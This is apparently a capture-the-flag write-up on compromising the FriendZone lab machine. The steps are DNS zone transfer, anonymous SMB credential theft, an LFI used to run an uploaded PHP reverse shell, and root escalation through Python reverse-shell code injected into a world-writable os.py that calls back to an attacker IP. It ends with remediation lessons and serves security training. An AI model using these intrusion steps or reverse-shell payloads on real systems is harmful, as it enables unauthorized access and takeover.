# FriendZone Writeup w/o Metasploit

![](https://miro.medium.com/max/583/1*ZTQHl89ShgFw6LY7tSyHbQ.png)

## Reconnaissance <a id="991f"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.123
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that seven ports are open:

* **Port 21:** running ftp vsftpd 3.0.3
* **Port 22**: running OpenSSH 7.6p1 Ubuntu 4
* **Port 53:** running ISC BIND 9.11.3–1ubuntu1.2 \(DNS\)
* **Ports 80 & 443**: running Apache httpd 2.4.29
* **Ports 139 and 145:** Samba smbd 4.7.6-Ubuntu

```text
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-15 21:19 EST
Nmap scan report for 10.10.10.123
Host is up (0.030s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
...........
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=11/15%OT=21%CT=1%CU=40251%PV=Y%DS=2%DC=I%G=Y%TM=5DCF5C
OS:FC%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:
|_clock-skew: mean: -48m45s, deviation: 1h09m16s, median: -8m46s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-11-16T04:11:17+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-15 21:11:17
|_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.10 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA full 10.10.10.123
```

We get back the following result. No other ports are open.

```text
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-15 21:26 EST
Nmap scan report for 10.10.10.123
Host is up (0.030s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
..........
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=11/15%OT=21%CT=1%CU=31322%PV=Y%DS=2%DC=I%G=Y%TM=5DCF5E
OS:C4%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=FB%GCD=1%ISR=102%TI=Z%CI=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:
|_clock-skew: mean: -48m45s, deviation: 1h09m16s, median: -8m46s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-11-16T04:18:54+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-15 21:18:54
|_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.93 seconds
```

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA udp 10.10.10.123
```

I managed to root the box and write this blog while the UDP scan did not terminate. So instead I ran a scan for the top 1000 ports.

![](https://miro.medium.com/max/648/1*WGmxHgmxpMlcCnyiEuGqyA.png)

Two ports are open.

* **Port 53:** running DNS
* **Port 137:** running SMB

Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.

1. The -sC flag checks for anonymous login when it encounters an FTP port. Since the output did not include that anonymous login is allowed, then it’s likely that we’ll need credentials to access the FTP server. Moreover, the version is 3.0.3 which does not have any critical exploits \(most FTP exploits are for version 2.x\). So FTP is very unlikely to be our point of entry.
2. Similar to FTP, there isn’t many critical exploits associated with the version of SSH that is being used, so we’ll need credentials for this service as well.
3. Port 53 is open. The first thing we need to do for this service is get the domain name through nslookup and attempt a zone transfer to enumerate name servers, hostnames, etc. The ssl-cert from the nmap scan gives us the common name friendzone.red. This could be our domain name.
4. Ports 80 and 443 show different page titles. This could be a virtual hosts routing configuration. This means that if we discover other hosts we need to enumerate them over both HTTP and HTTPS since we might get different results.
5. SMB ports are open. We need to do the usual tasks: check for anonymous login, list shares and check permissions on shares.

We have so many services to enumerate!

## Enumeration <a id="fcc2"></a>

I always start off with enumerating HTTP first. In this case both 80 and 443 are open so we’ll start there.

**Ports 80 & 443**

Visit the site on the browser.

![](https://miro.medium.com/max/906/1*j83IPksq3B3oDLuuWiZJsQ.png)

We can see the email is info@friendzoneportal.red. The friendzoneportal.red could be a possible domain name. We’ll keep it in mind when enumerating DNS.

View the source code to see if we can find any other information.

![](https://miro.medium.com/max/621/1*0U_a5hTX8_5MwY8ngAeiNA.png)

Nope. Next, run gobuster to enumerate directories.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.123
```

We get back the following result.

![](https://miro.medium.com/max/847/1*mn5ynlnQPxHI1VNXdyxZag.png)

The /wordpress directory doesn’t reference any other links. So I ran gobuster on the /wordpress directory as well and didn’t get anything useful.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.123/wordpress
```

![](https://miro.medium.com/max/845/1*VAnuv9O7eVkagpfZEkaefw.png)

Visiting the site over HTTPS \(port 443\) gives us an error.

![](https://miro.medium.com/max/542/1*E3qjmC4Nmk2HzvdYpRQ-EA.png)

Therefore, let’s move on to enumerating DNS.

**Port 53**

Try to get a domain name for the IP address using nslookup.

```text
nslookup
server 10.10.10.123
10.10.10.123
```

![](https://miro.medium.com/max/560/1*nsfeKj-Ksuf5nmlxJ5HIFw.png)

We don’t get anything. However, we do have two possible domains from previous enumeration steps:

* friendzone.red from the nmap scan, and
* friendzoneportal.red from the HTTP website

Let’s try a zone transfer on both domains.

```text
# zone transfer command: host -l <domain-name> <dns_server-address>
host -l friendzone.red 10.10.10.123 > zonetransfer.txt
host -l friendzoneportal.red 10.10.10.123 >> zonetransfer.txt
```

Open to the zonetransfer.txt file to see if we got any subdomains.

![](https://miro.medium.com/max/537/1*M0iBK8_K42JXc-SthUGNRw.png)

Add all the domains/subdomains in the /hosts/etc file.

```text
10.10.10.123 friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

Now we start visiting the subdomains we found. Remember that we have to visit them over both HTTP and HTTPS because we’re likely to get different results.

The following sites showed us particularly interesting results.

1. [https://admin.friendzoneportal.red/](https://admin.friendzoneportal.red/) and [https://administrator1.friendzone.red/](https://administrator1.friendzone.red/) have login forms.
2. [https://uploads.friendzone.red/](https://uploads.friendzone.red/) allows you to upload images.

I tried default credentials on the admin sites but that didn’t work. Before we run a password cracker on those two sites, let’s enumerate SMB. We might find credentials there.

**Ports 139 & 445**

Run smbmap to list available shares and permissions.

```text
smbmap -H 10.10.10.123
```

* **-H**: host

We get back the following result.

![](https://miro.medium.com/max/759/1*i-969O6ghR7QCC15dWjXcQ.png)

We have READ access on the general share and READ/WRITE access on the Development share. List the content of the shares.

```text
smbmap -R -H 10.10.10.123
```

* **-R:** Recursively list directories and files on all accessible shares

![](https://miro.medium.com/max/776/1*RywmWZ3WfEnP8lF_Y1aLEg.png)

The Development share does not contain anything, but the general directory has a file named creds.txt! Before we download the file, let’s use smbclient to view more information about the shares.

```text
smbclient -L //10.10.10.123
```

* **-L:** look at what services are available on a server

![](https://miro.medium.com/max/769/1*n7tSMMqQx33vfBaXTikxhw.png)

The extra information this gives us over smbmap is the Comment column. We can see that the files in the Files share are stored in /etc/Files on the system. Therefore, there’s a good possibility that the files stored in the Development share \(which we have WRITE access to\) are stored in /etc/Development. We might need this piece of information in the exploitation phase.

Let’s get the creds.txt file. First, login anonymously \(without a password\) into the general share.

```text
smbclient //10.10.10.123/general -N
```

* **-N:** suppresses the normal password prompt from the client to the user

![](https://miro.medium.com/max/704/1*nuw-IzMmv47nAw3DItODuA.png)

Download the creds.txt file from the target machine to the attack machine.

```text
get creds.txt
```

View the content of the file.

```text
cat creds.txt
```

We have admin credentials!

```text
creds for the admin THING:admin:WORKWORKHhallelujah@#
```

Try the credentials on FTP.

![](https://miro.medium.com/max/572/1*jqtQhomcwIL0veO_nPxpmQ.png)

Doesn’t work. Next, try SSH.

![](https://miro.medium.com/max/571/1*OqFTxyNrZQARfZaJYfk26Q.png)

Also doesn’t work. Next, try it on the [https://admin.friendzoneportal.red/](https://admin.friendzoneportal.red/) login form we found.

![](https://miro.medium.com/max/780/1*webImzu1uQIGjIjzHLZ6xQ.png)

Also doesn’t work. Next, try the credentials on the [https://administrator1.friendzone.red/](https://administrator1.friendzone.red/) login form.

![](https://miro.medium.com/max/600/1*icsJCIKb49A-c_rr_Y5amg.png)

We’re in! Visit the /dashboard.php page.

![](https://miro.medium.com/max/790/1*sc42Qfcz0hRKipeM3sV1Mw.png)

It seems to be a page that allows you to view images on the site. We’ll try to gain initial access through this page.

## Gaining an Initial Foothold <a id="0aa5"></a>

The dashboard.php page gives us instructions on how to view an image. We need to append the following to the URL.

```text
?image_id=a.jpg&pagename=timestamp
```

![](https://miro.medium.com/max/769/1*N_ShhPTERcBEUHo5Tj8iEg.png)

Let’s put that timestamp number in the pagename URL parameter. After we do that we no longer get a “Final Access timestamp…” message.

During our enumeration phase, we found a URL [https://uploads.friendzone.red/](https://uploads.friendzone.red/) that allows us to upload images. Let’s try and see if the images we upload there can be viewed through the dashboard page.

![](https://miro.medium.com/max/487/1*EmciZE_thgDiUaD4HL_k3w.png)

When we successfully upload the image random.jpg we get a timestamp. Let’s use the image and timestamp on the dashboard page.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=random.jpg&pagename=1573957506
```

![](https://miro.medium.com/max/760/1*p7Bl3ijUqHoWAKT9YNgUaA.png)

Nope, it doesn’t find the image. Let’s move our focus to the pagename parameter. It seems to be running a timestamp script that generates a timestamp and outputs it on the page. Based on the way the application is currently working, my gut feeling is that it takes the filename “timestamp” and appends “.php” to it and then runs that script. Therefore, if this is vulnerable to LFI, it would be difficult to disclose sensitive files since the “.php” extension will get added to my query.

Instead, let’s try first uploading a php file and then exploiting the LFI vulnerability to output something on the page. During the enumeration phase, we found that we have READ and WRITE permissions on the Development share and that it’s likely that the files uploaded on that share are stored in the location /etc/Development \(based on the Comments column\).

Let’s create a simple test.php script that outputs the string “It’s working!” on the page.

```text
<?php
echo "It's working!";
?>
```

Log into the Development share.

```text
smbclient //10.10.10.123/Development -N
```

Download the test.php file from the attack machine to the share.

```text
put test.php
```

Test it on the site.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
```

Remember not to include the .php extension since the application already does that for you.

![](https://miro.medium.com/max/767/1*pDOjwlUQ3_JF_xKFEre1ug.png)

Perfect, it’s working! The next step is to upload a php reverse shell. Grab the reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the IP address and port configuration.

Upload it in the same manner as we did with the test.php file. Then setup a listener on the attack machine.

```text
nc -nlvp 1234
```

Execute the reverse shell script from the website.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

We have a shell!

![](https://miro.medium.com/max/798/1*uMJNBUUfc2oz30fKGvAbtQ.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Now that we have an interactive shell, let’s see if we have enough privileges to get the user.txt flag.

```text
cat home/friend/user.txt
```

![](https://miro.medium.com/max/566/1*daEuWO90ISC-JH32y_pLHA.png)

We need to escalate privileges to get the root flag.

## Privilege Escalation <a id="e973"></a>

We have rwx privileges on the /etc/Development directory as www-data. So let’s upload the LinEnum script in the Development share.

```text
put LinEnum.sh
```

In the target machine, navigate to the /etc/Development directory.

```text
cd /etc/Development/
```

Give the script execute permissions.

```text
chmod +x LinEnum.sh
```

I don’t seem to have execute permissions in that directory, so I’ll copy it to the tmp directory.

```text
cp LinEnum.sh /tmp/
```

Navigate to the /tmp directory and try again.

```text
cd /tmp/
chmod +x LinEnum.sh
```

That works, so the next step is to execute the script.

```text
./LinEnum.sh
```

The results from LinEnum don’t give us anything that we could use to escalate privileges. So let’s try pspy. If you don’t have the script, you can download it from the following github repository.

```text
https://github.com/DominicBreuker/pspy
```

Upload it and run it on the attack machine in the same way we did for LinEnum.

After a minute or two we see an interesting process pop up

![](https://miro.medium.com/max/855/1*ELWaTMHXkdL5lyw-P9w5xw.png)

It seems that the reporter.py script is getting executed every couple of minutes as a scheduled task. Let’s view the permissions we have on that file.

```text
ls -la /opt/server_admin/
```

![](https://miro.medium.com/max/563/1*jPYt-mDiW0Fjg5n8FY2OXA.png)

We only have read permission. So let’s view the content of the file.

```text
cat /opt/server_admin/reporter.py
```

Here’s the soure code of the script.

```text
#!/usr/bin/pythonimport osto_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"print "[+] Trying to send email to %s"%to_address#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''#os.system(command)# I need to edit the script later
# Sam ~ python developer
```

Most of the script is commented out so there isn’t much to do there. It does import the os module. Maybe we can hijack that. Locate the module on the machine.

```text
locate os.py
```

![](https://miro.medium.com/max/593/1*-qr6COS9TbJo4BZAmaGoxA.png)

Navigate to the directory and view the permissions on the file

```text
cd /usr/lib/python2.7
ls -la | grep os.py
```

![](https://miro.medium.com/max/599/1*eH3BIGL4W0Rh0ggXOFX8uQ.png)

We have rwx privileges on the os.py module! This is obviously a security misconfiguration. As a non-privileged user, I should only have read access to the script. If we add a reverse shell to the script and wait for the root owned scheduled task to run, we’ll get back a reverse shell with root privileges!

I tried accessing the os.py script using vi but the terminal was a bit screwed up. Here’s a way to fix it \(courtesy of ippsec\).

Go to a new pane in the attack machine and enter the following command.

```text
stty -a 
```

![](https://miro.medium.com/max/1019/1*YQ8m2vZcksaAjlfOhOR4DQ.png)

We need to set the rows to 29 and the columns to 113. Go back to the netcat session and run the following command.

```text
stty rows 29 columns 113
```

Even after this, vi was still a bit glitchy, so instead, I decided to download the os.py module to my attack machine using SMB, add the reverse shell there and upload it back to the target machine.

Add the following reverse shell code to the bottom of the os.py file and upload it back to the target machine.

```text
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.6",1233));
dup2(s.fileno(),0); 
dup2(s.fileno(),1); 
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Setup a listener on the attack machine.

```text
nc -nlvp 1233
```

Wait for the scheduled task to run the reporter.py script that will in turn call the os.py module which contains our reverse shell code.

![](https://miro.medium.com/max/585/1*jjQSBmqo_rt1ZNVARm-xiw.png)

We get back a shell running with root privileges! Grab the root.txt flag.

![](https://miro.medium.com/max/451/1*3obEZ82oSJOdDwSeCPzvuA.png)

## Lessons Learned <a id="9341"></a>

To gain an initial foothold on the box we exploited six vulnerabilities.

1. The ability to perform a zone transfer which allowed us to get a list of all hosts for the domain. To prevent this vulnerability from occurring, the DNS server should be configured to only allow zone transfers from trusted IP addresses. It is worth noting that even if zone transfers are not allowed, it is still possible to enumerate the list of hosts through other \(not so easy\) means.
2. Enabling anonymous login to an SMB share that contained sensitive information. This could have been avoided by disabling anonymous / guest access on SMB shares.
3. If anonymous login was not bad enough, one of the SMB shares also had WRITE access on it. This allowed us to upload a reverse shell. Again, restrictions should have been put in place on the SMB shares preventing access.
4. Saving credentials in plaintext in a file on the system. This is unfortunately very common. Use a password manager if you’re having difficulty remembering your passwords.
5. A Local File Inclusion \(LFI\) vulnerability that allowed us to execute a file on the system. Possible remediations include maintaining a white list of allowed files, sanitize input, etc.
6. Security misconfiguration that gave a web dameon user \(www-data\) the same permissions as a regular user on the system. I shouldn’t have been able to access the user.txt flag while running as a www-data user. The system administrator should have conformed to the principle of least privilege and the concept of separation of privileges.

To escalate privileges we exploited one vulnerability.

1. A security misconfiguration of a python module. There was a scheduled task that was run by root. The scheduled task ran a script that imported the os.py module. Usually, a regular user should only have read access to such modules, however it was configured as rwx access for everyone. Therefore, we used that to our advantage to hijack the python module and include a reverse shell that eventually ran with root privileges. It is common that such a vulnerability is introduced into a system when a user creates their own module and forgets to restrict write access to it or when the user decides to lessen restrictions on a current Python module. For this machine, we encountered the latter. The developer should have been very careful when deciding to change the default configuration of this specific module.

